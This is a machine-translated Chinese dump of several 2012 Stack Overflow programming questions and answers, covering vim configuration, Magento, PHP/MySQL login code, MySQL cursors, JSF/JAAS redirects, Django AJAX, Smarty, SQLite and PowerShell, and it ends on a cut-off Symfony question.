我想利用 vim 在每个 unix 上都可用的事实，但我也想利用与终端的漂亮集成来进行快速测试，我只是切换回终端，但为此我需要关闭 vim。当我重新打开它时，我必须再次加载 vimrc。而且我是新手，我什至没有插件...

我想保持与终端的集成，并且只开发一种超级快速的方式来将我的更改引入 vim。把这些条件想象成好像你正坐在新安装的操作系统上。

谢谢 ！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T17:22:51.153

不是直接针对您的问题，但您始终可以使用 调用 vim `-u`，这将让您指定您的 vimrc 文件，而不是启动 vim 然后运行`:so`​​.

`.vimrc`您的文件的默认位置是`~/.vimrc`（在 mac 上，`~`是`/Users/_you_`，例如`/Users/matt`）。如果你可以在那里写你的文件，它会在每次 vim 启动时加载。

mac 上的系统 vimrc 文件位于`/usr/share/vim/vimrc`，但听起来这些系统不在你的控制之下，所以你将无法写入该文件。看看：[如何在 vim 中覆盖 ~/.vim 和 ~/.vimrc 路径（但没有其他路径）？](https://stackoverflow.com/questions/3377298/how-can-i-override-vim-and-vimrc-paths-but-no-others-in-vim)，它使用该`-u`选项来更改 vim 在下查找插件的路径。但是，在所有情况下，您必须能够将您的主目录写入您`.vimrc`的主目录（听起来您的系统不允许）或在运行时指定它的路径（如我上面提到的命令行选项，或者使用`:so`您当前正在使用的普通命令）。

根据您需要进行的测试类型，您始终可以使用`!`in normal 模式在 vim 中运行 shell 命令。例如，我经常在缓冲区中对 python 文件进行更改，然后（在正常模式下）`!nosetests`在 vim 中运行——它将终端输出写入底部的临时缓冲区，并且不需要我离开或挂起 vim。我可以查看输出，任何按键都会将我带回缓冲区。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-19T17:23:56.347

我对 Mac-Os 终端没有任何经验。但是我想如果你可以将你的 .vimrc 文件复制到你的主目录。每次你启动 vim，vim 都会从你的主目录加载 .vimrc 文件。

如果您想从 vim 切换回终端以进行一些测试/执行一些命令并返回 vim。你可以考虑：

*   打开多个终端窗口
*   尝试类似 screen 或 tmux 的东西。个人我正在使用 tmux，它非常好。
*   试试 Conque Shell 插件：[http](http://www.vim.org/scripts/script.php?script_id=2771) ://www.vim.org/scripts/script.php?script_id=2771我也安装了这个插件。
*   在 vim 中键入 Ctrl-z 以返回终端

如果你想在不同的机器上同步你的 .vimrc，你可以把你的 .vimrc 文件放在

*   像 gitHub、bitbucket 这样的 scm 存储库...（我更喜欢这个选项，因为您可以为不同的设置设置不同的分支）

*   保管箱

    我希望这有帮助。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-19T18:07:49.397

注销后如何不保存您的更改？这样的机器有什么意义？机场的上网亭？您是否以没有“主”目录的用户身份登录？

如果您有一个“主”目录，只需创建一个空白`~/.vimrc`并将您的设置放在那里。

如果您没有“主”目录但您可以在其他地方写入，请在可以的地方创建一个空白`vimrc`文件，在那里写入您的设置并牢记此命令：

```
$ vim -u /path/to/your/vimrc 
```

如果您没有“主”目录并且您*确实*确定无法在这些机器上保存任何内容，请将您的设置放在在线某个文件中，最好是在您控制的地方，并记住这个命令：

```
$ vim -u http://domain.name/yourvimrc 
```

如果你幸运的话，你使用的命令会被你的 shell 记住，并且很容易再次发出它而无需输入太多。

为了运行您的测试，您可以：

*   点击`<C-z>`暂停 Vim。你回到了你启动 Vim 的提示符处，你可以做你的事了。键入`$ fg`以返回 Vim。

*   键入`:sh`以从当前目录启动新的 shell。要返回 Vim，请键入`$ exit`.

# magento - magento 网络服务

> ID：13957503
> 
> 赞同：0
> 
> 时间：2012-12-19T17:07:37.663
> 
> 标签：magento

我想按税级 id 获取产品列表。我将如何做？

```
 $collection = Mage::getModel('catalog/product');
    $result = array();
    foreach ($collection as $product) { 
        $result[] = array(
            'product_id' => $product->getId(),
            'sku'        => $product->getSku(),
            'name'       => $product->getName(),
            'set'        => $product->getAttributeSetId(),
            'type'       => $product->getTypeId(),
            'category_ids' => $product->getCategoryIds()

             );

    } 
```

这是我的代码我将如何修改它以获得结果

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:09:37.523

对产品集合使用属性过滤器。

```
Mage::getModel('catalog/product')->getCollection()->addAttributeToFilter('tax_class_id', $my_tax_class_id); 
```

编辑：对不起，我忘了添加 getCollection 方法来获取产品集合而不是模型。

# php - mysql_fetch_assoc() 只需要 1 个字段的参数 1？

> ID：13957506
> 
> 赞同：0
> 
> 时间：2012-12-19T17:07:59.973
> 
> 标签：php, mysql

> **可能重复：**
> [mysql_fetch_array() 期望参数 1 是资源，选择中给出的布尔值](https://stackoverflow.com/questions/2973202/mysql-fetch-array-expects-parameter-1-to-be-resource-boolean-given-in-select)

当我执行这个 sql 突击队时：

```
$sql = "SELECT `id`, `password`, `salt` FROM `users` WHERE `username` = '".mysql_real_escape_string($_POST['name'])."'"; 
```

我收到此错误：

```
Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in /index.php on line 8 
```

那行是我上面 SQL 突击队的 mysql_fetch_assoc。

当我`salt`从 SELECT 中删除它时它可以工作。

但我需要`salt`选择，所以我尝试在数据库和 SQL 突击队中重命名它。

但由于某种原因，这并没有奏效。

然后我尝试删除数据库字段，然后重新制作。但仍然没有运气。

注意：突击队运行，但由于某种原因它仍然出现此错误。我试图从数据库中的选择中回显一些信息，并且效果很好。它实际上会给我所有选定的信息，甚至是`salt`，但错误仍然显示..有什么想法吗？

整页源码：

```
 if (isset($_POST['login'])) {
            $msg = "Brugernavn og kodeord passer ikke sammen.";
            $sql = "SELECT `id`, `password`, `salt` FROM `users` WHERE `username` = '".mysql_real_escape_string($_POST['name'])."'";
            //echo $sql;
            $query = mysql_query($sql) or die(mysql_error());
            if (mysql_num_rows($query)) {
                while ($row = mysql_fetch_assoc($query)) {
                //print_r($row);
    /*          echo "<pre>";
                print_r($row);
                echo "</pre>";*/
                    $password = md5(hash("sha512",mysql_real_escape_string($_POST['pass']), $row['salt']));
    /*              echo "<pre>";
                    echo $password;
                    echo "</pre>";
                    echo "<pre>";
                    echo $_POST['pass'];
                    echo "</pre>";*/
                    if ($password == $row['password']) {
                        $key = md5( rand(0,1000) );
                        //echo $key;
                        $sql = "UPDATE `users` SET `key` = '".$key."' WHERE `id` = '".$row['id']."'";
                        $query = mysql_query($sql);
                        //login success
                        $_SESSION['key'] = $key;
                        $_SESSION['id'] = $row['id'];
                        if (isset($_POST['remember']) && $_POST['remember'] == 1) {
                            $_COOKIE['key'] = $key;
                            $_COOKIE['id'] = $row['id'];
                        }
                        $msg = "Du er nu blevet logged ind.";
                    }
                }
            }
        } 
```

# mysql - 存储过程中的无数据错误

> ID：13957507
> 
> 赞同：1
> 
> 时间：2012-12-19T17:08:00.483
> 
> 标签：mysql, stored-procedures

我正在将 SQL Server 2005 数据库转换为 MySQL 并遇到存储过程问题。我是 MySQL 存储过程的新手，所以我确定这是我的转换问题，但我没有看到它。

存储过程应该生成一个临时表，用于在 vb.net 应用程序中填充数据网格视图。但是，我收到错误“数据无数据 - 提取、选择或处理了零行。”。看起来很简单，但是如果我只是将存储过程中的选择过程作为查询运行，它将获取数据，这就是为什么我不明白为什么会出现错误。

我真的希望有人能告诉我原因，因为我有数百个存储过程要转换，而我在第一个过程中就遇到了这个问题。

**这是存储过程：**

```
DELIMITER $$

DROP PROCEDURE IF EXISTS `usp_get_unassigned_media`$$

CREATE DEFINER=`showxx`@`67.111.11.110` PROCEDURE `usp_get_unassigned_media`()
BEGIN
    /* GET CURSOR WITH LOCAL LOCATIONS */
    DECLARE intKey INT; 
    DECLARE dteDateInserted DATETIME;
    DECLARE vchIdField VARCHAR(200); 
    DECLARE vchValueField VARCHAR(200); 
    DECLARE intLastKey INT;

/*TAKE OUT SPECIFIC PLAYLIST ITEMS IF TOO SLOW*/
DECLARE csrMediaToBeAssigned CURSOR FOR
SELECT
  `media`.`key`             AS `key`,
  `media`.`date_inserted`   AS `date_inserted`,
  `media_detail_types`.`id` AS `id`,
  `media_details`.`value`   AS `value`
FROM (`media`
   LEFT JOIN (`media_detail_types`
          JOIN `media_details`
        ON ((`media_detail_types`.`key` = `media_details`.`detail_key`)))
     ON ((`media_details`.`media_key` = `media`.`key`)))

WHERE ((`media`.`is_assigned` = 0)
       AND ((`media_detail_types`.`id` = 'Volume Name')
         OR (`media_detail_types`.`id` = 'Drive Id')))
ORDER BY `media`.`key`,`media`.`date_inserted`,`media_detail_types`.`id`;

OPEN csrMediaToBeAssigned;

DROP TEMPORARY TABLE IF EXISTS temp_unassigned_media;
CREATE TEMPORARY TABLE temp_unnassigned_media 
    (temp_key INT, DateInserted DATETIME, IdField VARCHAR(200), ValueField VARCHAR (200)) 
    ENGINE=MEMORY;
SET intLastKey = 0;
/*--GET FIRST RECORD */

FETCH FROM csrMediaToBeAssigned
    INTO intKey, dteDateInserted, vchIdField, vchValueField;
/*--LOOP THROUGH CURSOR */
WHILE intLastKey = 0 DO
    /*--DATA SHOULD BE IN DRIVE ID THEN VOLUME NAME */

    INSERT INTO  temp_unnassigned_media
        VALUES (intKey, dteDateInserted, vchValueField, '');
    FETCH NEXT FROM csrMediaToBeAssigned
        INTO intKey, dteDateInserted, vchIdField, vchValueField;

    UPDATE temp_unnassigned_media
        SET IdField = vchValueField
        WHERE temp_key = temp_key;
    FETCH NEXT FROM csrMediaToBeAssigned
        INTO intKey, dteDateInserted, vchIdField, vchValueField;

END WHILE;
SELECT * 
    FROM temp_unnassigned_media 
    ORDER BY date_inserted; 
CLOSE csrMediaToBeAssigned;     
/*DEALLOCATE csrMediaToBeAssigned   */
/*DROP TABLE #temp_unnassigned_media    */

END$$

DELIMITER ; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:21:07.363

您永远不会遇到 WHILE 循环将退出的条件；您初始化 intLastKey 变量，但它永远不会改变，因此您获取整个结果集。当您在最后一条记录之后再次获取时，将引发异常。

规范模式是声明 a ，当条件被触发`CONTINUE HANDLER`时 MySQL 将执行它。`NOT FOUND`处理程序通常用于设置一个变量，然后您可以对其进行测试，因此您知道何时退出循环。

在您的情况下，看起来只需在您的`DECLARE CURSOR`语句之后和语句之前添加这一行`OPEN`就足够了：

```
DECLARE CONTINUE HANDLER FOR NOT FOUND SET intLastKey = 1; 
```

# javascript - 在另一个页面上获取输入框的值

> ID：13957509
> 
> 赞同：2
> 
> 时间：2012-12-19T17:08:11.053
> 
> 标签：javascript, html

我有两页；`page1`和`page2`。`page1`持有一个表格，同时`page2`有一些图像。我想在表单中输入一个句子`page1`并获取该文本框的值`page2`。

上的表格`page1`

```
<form name="input" action="page2.html" method="get">
    <input type="text" name="textbox" id="textbox">
    <input type="submit" value="Submit">
</form> 
```

解决这个问题的正确方法是什么？

我会使用该`get`方法和该`action`方法通过 url 发送值，然后使用`window.location.href`然后在之后拆分文本来提取它，`?`还是有更简单的方法来实现这一点？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:10:38.337

正如您所说，只需将其发送到查询字符串中并在 page2 中读取即可。

请参阅此内容以了解如何读取查询字符串参数：

[如何在 JavaScript 中获取查询字符串值？](https://stackoverflow.com/questions/901115/how-can-i-get-query-string-values)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-19T17:11:17.847

你这样做的方式会奏效，尽管它肯定不是一个好的长期解决方案。如果您的网站变得更加复杂，最好使用 .NET、PHP、Ruby 等服务器端语言。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-19T17:12:17.163

如果您必须仅使用 JS 获取数据，那么您需要使用 URL。否则你可以使用像jsp这样的服务器端脚本。

使用 URL 时，请确保文本在附加到 URL 之前经过 URL 编码。

# java - 如何在java中设置IP地址

> ID：13957515
> 
> 赞同：0
> 
> 时间：2012-12-19T17:08:39.480
> 
> 标签：java, ip

我想在 c# 中禁用网络进行测试，就像这个解决方案一样：[如何为测试目的模拟网络故障（在 C# 中）？](https://stackoverflow.com/questions/474803/how-to-simulate-network-failure-for-test-purposes-in-c) 它建议将 ip 设置为虚假的静态地址。如何从 Java 或 Groovy 设置 ip？

[此解决方案适用于 windows](https://stackoverflow.com/questions/2279125/set-ip-adress-for-network-interface-in-windows-xp-from-java)。我正在使用 Mac。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T11:01:55.083

为 JVM 设置一个代理来丢弃所有请求怎么样？

您不必更改系统配置，如果您想要一些高级属性，可以通过固定装置完成代理处理。

在我看来，这似乎是一种探索方式

# browser-cache - 应用程序缓存错误

> ID：13957516
> 
> 赞同：1
> 
> 时间：2012-12-19T17:08:40.943
> 
> 标签：browser-cache, offline-caching, offlineapps, offline-mode, offline-browsing

我有这个错误： **应用程序缓存错误事件：清单获取失败（-1）
*http://localhost:8080/offline.manifest* 在线：否，事件：错误，状态：空闲**

此 JSON 字符串显示错误的内容： **({"returnValue":true,"eventPhase":2,"timeStamp":1355923608009,"target":{"onprogress":null,"onchecking":null,"onerror" :null,"onupdateready":null,"oncached":null,"ondownloading":null,"status":1,"onobsolete":null,"onnoupdate":null},"type":"error","cancelBubble ":false,"cancelable":false,"defaultPrevented":false,"srcElement":{"onprogress":null,"onchecking":null,"onerror":null,"onupdateready":null,"oncached":null ,"ondownloading":null,"status":1,"onobsolete":null,"onnoupdate":null},"bubbles":false,"currentTarget":{"onprogress":null,"onchecking":null,"onerror":null,"onupdateready":null,"oncached":null,"ondownloading":null,"status":1,"onobsolete": null,"onnoupdate":null}}) debug.js:34**

我用**JSON.stringify(error)**得到了它。

好的，我有这个信息。但是从这里可以理解什么？？？问题出在哪里？我该如何解决？

先感谢您。

# java - 在 JAAS 重定向之前检索请求的 URL

> ID：13957517
> 
> 赞同：5
> 
> 时间：2012-12-19T17:08:41.633
> 
> 标签：java, jsf, redirect, login, jaas

是否可以在 JAAS 重定向之前检索用户请求的 URL？

我的 web.xml 是这样的：

```
<login-config>
    <auth-method>FORM</auth-method>
    <form-login-config>
        <form-login-page>/login.jsf</form-login-page>
        <form-error-page>/login.jsf</form-error-page>
    </form-login-config>
</login-config> 
```

所以，当我没有登录并尝试去前。`www.blah.com/myApp/users.jsf` 然后应用程序将我重定向到**login.jsf**但 url 仍然与用户请求的相同。

然后我填写登录表单并单击登录，这将转到我的 backbean，其中调用我的 loginModule 和 callbackHandler 例如：

```
public String actionLogin(){
   //do my login and stuff
   return "page that user requested";
} 
```

我尝试了很多方法来获取用户请求的页面。`request.getRequestURL()`

所有人都回来了：`www.blah.com/myApp/login.jsf`

有什么方法可以获取请求的页面？`www.blah.com/myApp/users.jsf`

问候

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:12:37.960

登录页面由服务器端转发在内部打开[`RequestDispatcher#forward()`](http://docs.oracle.com/javaee/6/api/javax/servlet/RequestDispatcher.html#forward%28javax.servlet.ServletRequest,%20javax.servlet.ServletResponse%29)。因此，这意味着最初请求的页面可用作请求属性，其名称与[`RequestDispatcher.FORWARD_REQUEST_URI`](http://docs.oracle.com/javaee/6/api/javax/servlet/RequestDispatcher.html#FORWARD_REQUEST_URI)常量中指定的名称相同。因此，在 JSF 术语中，可用如下方式：

```
String originalURI = (String) externalContext.getRequestMap().get(RequestDispatcher.FORWARD_REQUEST_URI);
String originalQuery = (String) externalContext.getRequestMap().get(RequestDispatcher.FORWARD_QUERY_STRING);

if (originalQuery != null) {
    originalURI+= "?" + originalQuery;
} 
```

*（请记住，在它返回的情况下有一个备用 URL `null`，即直接打开它而不先点击受限 URL 时）*

收集它的最佳位置是`@ViewScoped`与登录页面关联的 bean 的（后）构造函数。

### 也可以看看：

*   [使用 j_security_check 在 Java EE / JSF 中执行用户身份验证](https://stackoverflow.com/questions/2206911/best-way-for-user-authentication-on-javaee-6-using-jsf-2-0/2207147#2207147)

# jquery - django：ajax 渲染到模板

> ID：13957518
> 
> 赞同：3
> 
> 时间：2012-12-19T17:08:43.703
> 
> 标签：jquery, ajax, django

我的模板：

```
{% block content %}
    {% if next_url %}
        <ul class="pager">
            <li><a href="{{ next_url}}">Next</a></li>
        </ul>
    {% endif %}
    {% if photos %}
        {% for photo in photos %}
            <div class="span3" >
                <p>
                    <a href="http://instagram.com/{{ photo.user.username }}"><img src="{{ photo.user.profile_picture }}" width="35" height="35"></a> <a href="http://instagram.com/{{ photo.user.username }}">{{ photo.user.username }}</a>
                    <span class="info_down">[ <a href="{{ photo.images.thumbnail.url }}">T</a> | <a href="{{ photo.images.standard_resolution.url }}">M</a> | <a href="{{ photo.images.low_resolution.url }}">L</a> | <a href="{{ photo.link }}">O</a> ]</span>
                </p>
                <p>
                    <img src="{{ photo.images.low_resolution.url }}">
                </p>
                <p>
                    <i class="icon-heart"></i> {{ photo.l }}
                </p>
                <p>
                    <i class="icon-time"></i> {{ photo.created_time }} <a style="float:right;" href="http://maps.google.com.ua/maps?q={{ photo.location.point.latitude }}+{{ photo.location.point.longitude }}"><i class="icon-map-marker"></i>  Map</a>
                </p>
            </div>

        {% endfor %}
    {% else%}
        <p>empty ;(</p>
    {% endif %}
{% endblock %}

{% block pagination %}
    {% if next_url %}
        <div class="span12" >
            <ul class="pager">
                <li>
                    <a href="{{ next_url}}">Next</a>
                </li>
            </ul> 
        </div>
    {% endif %}
{% endblock %} 
```

还有一个视图，通过外部 api 获取“照片”和“下一个 URL”并进行一些更改：

```
def tag(request, tag):
    api = InstagramAPI(client_id='', client_secret='')
    tag_m, next = api.tag_recent_media(tag_name=tag.encode('utf-8'), count=16)
    photos = photos + tag_m

    if next != None:
        ....
        next_url = ....

    ....
    for photo in photos:
    ....

    return render_to_response(
        'tag.html',
        {'photos': photos, 'next_url': next_url},
        context_instance=RequestContext(request)) 
```

如何通过 ajax 动态显示这些数据？我想将 next_url 的结果附加到当前页面（加载更多功能）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:57:50.207

这就是您要做的：单击时，您可以触发`[ajax][1]`提交。成功后，您将获得附加到 div 的 HTML。

```
$('.span12 .pager li a').click(function(){
    var href = $(this).attr('href');
    $.ajax({
        url: href,
        success: function(data, status, xhr){
           // append the response data in the HTML
        }
    });
}); 
```

# php - PHP Smarty 插入函数和变量

> ID：13957522
> 
> 赞同：0
> 
> 时间：2012-12-19T17:09:13.957
> 
> 标签：php, smarty

我有这个聪明的模板，我需要从我的文件中调用一个函数。

一切正常，php 识别参数，但不是 smarty 变量的值。代码：

```
{insert name=file_details value=a assign=fd fid=$m[i].FID}
<ul class='list'>
    {section name=x loop=$fd}
        {insert name=gfs assign=afs a=$fd[x]}
        <li><a href="{$baseurl}/files/{$fd[x].FID|md5}{$fd[x].s}/{$fd[x].fname}" target="_blank">
        {$fd[x].fname} <b>[{$afs}]</b>
        </a></li>
    {/section}
</ul> 
```

意义。第一个插入从我的数据库中检索一些文件信息，使用作为参数 $m[i].FID 一切正常，当我告诉他例如 {$fd[x].fname} 它显示文件的名称，但是当我告诉他 {insert name=gfs assign=afs a=$fd[x]} 并在函数 insert_gfs 中创建一个 var_dump(a) 所有值都显示为空。

任何帮助都会很棒，我不知道我错过了什么

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T12:28:12.237

数组的编写方式`$m.i`与 Smarty 相同。不是`$m[i]`。

如果您像这样替换所有数组符号，它应该可以工作。

```
{insert name=file_details value=a assign=fd fid=$m.i.FID}
<ul class='list'>
    {section name=x loop=$fd}
        {insert name=gfs assign=afs a=$fd.x}
        <li><a href="{$baseurl}/files/{$fd.x.FID|md5}{$fd.x.s}/{$fd.x.fname}" target="_blank">
        {$fd.x.fname} <b>[{$afs}]</b>
        </a></li>
    {/section}
</ul> 
```

# forms - 表单顶部列表中的 Symfony2 验证错误

> ID：13957523
> 
> 赞同：0
> 
> 时间：2012-12-19T17:09:14.267
> 
> 标签：forms, validation, symfony

我一直对 Symfony2.1 表单验证感到头疼。我想要的只是表单顶部的常规列表，其中包含验证后包含的错误。广泛的搜索没有得到想要的解决方案。

还有几个问题：

1.  如何全局禁用特定于字段的错误，以便错误不会出现在字段旁边？我知道error_bubbling，但不需要为每个字段设置它。
2.  如何在表单顶部的简单列表中解析所有错误？我知道[如何覆盖 Twig 模板](http://symfony.com/doc/current/cookbook/form/form_customization.html#making-application-wide-customizations)，但这不会导致 form_errors 函数可以访问的一组错误

到目前为止我发现/调查的内容：

1.  [让所有表单验证错误显示在 symfony 的顶部？](https://stackoverflow.com/questions/1034625/make-all-form-validation-errors-show-up-at-top-in-symfony)
2.  [Symfony 2 中的表单范围的错误冒泡？](https://stackoverflow.com/questions/10322300/form-wide-error-bubbling-in-symfony-2)> 如果你有超过 4 个表格，那就太糟糕了
3.  [http://symfony.com/doc/current/book/forms.html](http://symfony.com/doc/current/book/forms.html) > 没有正确的解决方案
4.  [https://stackoverflow.com/a/8216192/1794894](https://stackoverflow.com/a/8216192/1794894) > 可能是一个解决方案，但不是一个好的解决方案

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T18:29:51.877

我可以想到两种方法来禁用错误：

1.  用 CSS 隐藏它们。
2.  覆盖 Twig 模板并删除错误输出。

至于在顶部列出所有错误，这有点困难。最好的办法是拉出表单字段列表并循环通过它们输出错误。

# objective-c - 如何防止 SQLite3 自动递增到相同的值两次？

> ID：13957524
> 
> 赞同：0
> 
> 时间：2012-12-19T17:09:20.417
> 
> 标签：objective-c, ios, sqlite

我发现 SQLite3 的自动增量总是比现有的最高主键多一。

例如，我创建了一条记录，它的 id 设置为 1。然后下一条记录的 id 设置为 2。如果我删除 id = 2 的记录并创建一条新记录，则新记录的 id 设置为 2，而不是3.

无论如何，他们是否让 sqlite3 的自动增量永远不会分配相同的值两次？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:36:54.370

[http://www.sqlite.org/autoinc.html](http://www.sqlite.org/autoinc.html)上的文档清楚地表明您看到的行为是预期的。文档还指出，您可以通过创建列来避免此问题：

```
INTEGER PRIMARY KEY AUTOINCREMENT 
```

# java - 不活动仪表

> ID：13957525
> 
> 赞同：3
> 
> 时间：2012-12-19T17:09:22.527
> 
> 标签：java, linux, windows, android-activity, shutdown

> **可能重复：**
> [java cpu 使用监控](https://stackoverflow.com/questions/2062440/java-cpu-usage-monitoring)

我正在尝试用 Java 编写一个程序，当计算机在一段时间内没有处于活动状态（如 CPU 使用率）时，它可以关闭您的计算机。

我写了一个程序，可以在一段时间后关闭你的电脑（windows/mac/linux）。但我似乎没有找到一种方法来检查 JAVA 中的 CPU 使用情况或不活动情况。

有人可以帮我吗？

亲切的问候，

克兰诺伊

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:22:32.057

恐怕您可能必须找到一个本地库。似乎没有任何非本地的方式来获取 CPU 使用情况，但是支持查找内存使用情况和其他使用情况指标。

如果您想以本机方式自己实现这一点，您可以查看哪些终端命令显示您的 CPU 使用情况，例如对于 linux，您可以执行`top`命令然后通过 Java 解析。

# ruby - 为存根编写可链接的 dsl

> ID：13957527
> 
> 赞同：0
> 
> 时间：2012-12-19T17:09:29.023
> 
> 标签：ruby, stub

在我正在编写的一些测试中，我需要创建很多非常相似的存根。我正在使用摩卡咖啡。

```
user.stubs(:hq?).returns(false)
user.stubs(:has_role?).with("admin").returns(true) 
```

等等。这是一个非常重复且不枯燥的组合事物。我想知道是否可以将其切换为某种可链接的 dsl。

```
user = user_stubber.hq.with_role("admin") 
```

在 Mocha 中是否有解决此问题的好方法。还是有更好的存根库可以给我这种能力？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T21:56:12.520

我最终的解决方案是我放入 /test/lib/ 中的这个 user_stubber.rb 文件。

```
require 'mocha'

class UserStubber

  def no_roles
    self.stubs(has_role?: false)
    self
  end

  def hq
    self.stubs(:hq?).returns(true)
    self
  end 

  def field
    self.stubs(:hq?).returns(false)
    self
  end

  def with_role(role)
    self.stubs(:has_role?).with(role).returns(true)
    self
  end
end 
```

在测试中我现在可以做：

```
user.no_roles.hq.with_role('admin') 
```

等等。而且由于它返回一个可存根的对象，我可以这样做

```
user.hq.stubs(:other_method).with(params).returns(true) 
```

# android - Android rawQuery GUI 检查查询

> ID：13957533
> 
> 赞同：1
> 
> 时间：2012-12-19T17:09:41.057
> 
> 标签：android, sqlite, debugging

一个工作了一段时间然后停止工作的查询有一个令人困惑的问题。使用try and catch，没有错误它只是返回一个空游标？
是否有一个 GUI，您可以在其中运行查询以首先检查结果或查看错误，也许它是一些微妙的东西，比如键？我已经确认了数据类型，但不知道去哪里找。我对如何调试此类问题感到担忧，因此希望您能提供任何指导。
提前致谢。

代码集在单个表上工作正常，但是当我加入 2 个表时它现在失败（昨天工作）

**在职的：**

```
String selectQuery = 
    SELECT ou.*,"name" as Orchard_Name FROM " + TABLE_TP_ORCHARD_USER ou ; 
```

**在这种情况下**不工作连接查询：****

 **```
 String selectQuery = "SELECT  ou.tp_orchard_user_Orchard_ID as 
           tp_orchard_user_Orchard_ID,ou.tp_orchard_user_User_ID as 
           tp_orchard_user_User_ID,sd.Orchard_Name as Orchard_Name FROM " + 
           TABLE_TP_ORCHARD_USER + " ou JOIN " + TABLE_SD_ORCHARD + " sd  on
           ou.tp_orchard_user_Orchard_ID=sd.Orchard_Id" ; 
```

我已经在另一个数据库上的 mysql 中运行了这段代码，这很好；似乎还有另一个eclipse无法显示的错误？还是我不知道怎么做？

我的代码示例是：

```
SQLiteDatabase db = this.getReadableDatabase();
Cursor daCursor = db.rawQuery(selectQuery,null);
if (daCursor != null) {  
        if(  daCursor.moveToFirst()  ){
        do{
  //      String Orchard_ID = 
                   daCursor.getString(daCursor.getColumnIndex("Orchard_Id"));
            String Orchard_ID =     daCursor.getString(0);
        Log.i("dbhandler fetchAllOrchards cursor Orchard_ID",
                                                          Orchard_ID);

                Log.i("dbhandler fetchAllOrchards cursor Orchard_ID",
                                                            Orchard_Name);
        } while (daCursor.moveToNext()); 

    } else{
        Log.i("cursor is false","fail");    
    }
} 
```**

# powershell - Powershell URL 替换

> ID：13957535
> 
> 赞同：1
> 
> 时间：2012-12-19T17:09:44.680
> 
> 标签：powershell, replace

尝试使用下面的代码更新一行。

```
 $dburl = 70.186.192.52
 $ptdb  = 3388

 $Se = "C:\File\location\edit.me"
(Get-Content $Se) |
   ForEach-Object { $_ -replace ("http://127.0.0.1:8190/storage/server"), 'http://$dburl:$ptdb/storage/server'  } | Set-Content $Se 
```

输出是：

```
http://$dburl:$ptdb/storage/server or http://\70.186.192.52\:3388/storage/server 
```

我已经尝试转义 // 和 : 但没有运气弄清楚这一点。任何人都有更好的方法来做到这一点。我浏览了该网站，但我发现的所有内容都没有解决这种直接情况。我这样说是为了不会因为不研究代码而受到任何负面评价。

[powershell 替换特殊字符](https://stackoverflow.com/questions/11899310/powershell-replace-special-characters)

这个给了我我得到的东西。而不是被替换的变量，它们只是完全按照输入的方式打印出来。我试过双引号，它打印端口而不是地址。如果我放了任何转义 / 或 \ 它只会在前面打印出来。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:41:55.843

我很惊讶这完全有效。尝试在替换字符串周围使用双引号，例如：

```
$dburl = '70.186.192.52'
$ptdb  = '3388'
... -replace ("http://127.0.0.1:8190/storage/server"), "http://${dburl}:$ptdb/storage/server" 
```

另外，引用您的两个变量值。

# c# - MVC4 - 如何将 EditorFor() 与数据库中的动态表单数据一起使用

> ID：13957536
> 
> 赞同：2
> 
> 时间：2012-12-19T17:09:46.517
> 
> 标签：c#, .net, asp.net-mvc-4

我的数据库中有名为 Sections and Fields 的表。部分包含字段。字段可以是文本框或复选框。我正在使用它来动态创建用于数据输入的 HTML 表单。

我有一个绑定到一个部分的视图：

```
@model Data.Section    

@using (Html.BeginForm("SaveSection", "MyController"))
{
    @Html.ValidationSummary(true)

    <div class="fields">
        @Html.EditorFor(m => m.Fields)    
    </div>

    <input type="submit" value="Save">
} 
```

然后，我的 EditorTemplates 文件夹中有一个字段的编辑器模板：

```
@model Photon.Data.Field

@if (Model != null)
{
    <span class="label">@Html.DisplayFor(m => m.Name)</span>

    <span class="field">
         @Html.EditorFor(m => m.FieldValues)
    </span>
} 
```

（我有一个 FieldValues 的编辑器模板，但我认为这与这里无关。）

上述解决方案非常适合列出文本框和复选框。当用户编辑它们然后单击保存时，它会发回我的控制器方法：

```
 [HttpPost]
    public ActionResult SaveSection(Section model)
    {
        // do some magic
    } 
```

传递给我的方法的部分模型是有效的，并且绑定到页面中的字段。

**这就是我难过的地方**：在其中一些部分中，字段需要以特定的 html 格式布局（如水平或看起来像文档中的表单）——基本上它们不能被列出。所以我的想法是为一个部分分配一个模板名称，然后加载该模板的所有字段，例如：

```
<div class="fields">
@if (Model.IsTemplated)
{
    @Html.EditorFor(m => m.Fields, Model.TemplateName)    
}
else
{
    @Html.EditorFor(m => m.Fields)    
}
</div> 
```

如果我想以不只是列表的特定 html 格式布置所有这些字段，我对 Model.TemplateName 的视图会是什么样子？

这是我所在的位置：

```
@model IEnumerable<Data.Field>

<table border="1">
    <tr>
        <td>
            How do I display one field here with EditorFor?
        </td>
        <td>
            How do I display another field here with EditorFor?
        </td>
        <td>
            How do I display and another field here with EditorFor?
        </td>
    </tr>
</table> 
```

想法？我走在正确的道路上吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T21:03:15.437

我不确定我是否正确理解了您的问题，但是如果您设法到达最终视图，那么在表格行中放置字段应该与此类似？

```
...
<tr>
    @foreach(var fld in Model)
    {
        <td>
            @Html.EditorFor(m => fld)
        </td>
    }
</tr>
... 
```

（我现在没有和剃须刀设计师一起坐在 Visual Studio 前面，所以对于任何拼写错误，我深表歉意..）

# symfony - Symfony2 国际化以获得更好的 SEO 策略

> ID：13957537
> 
> 赞同：0
> 
> 时间：2012-12-19T17:09:52.950
> 
> 标签：symfony

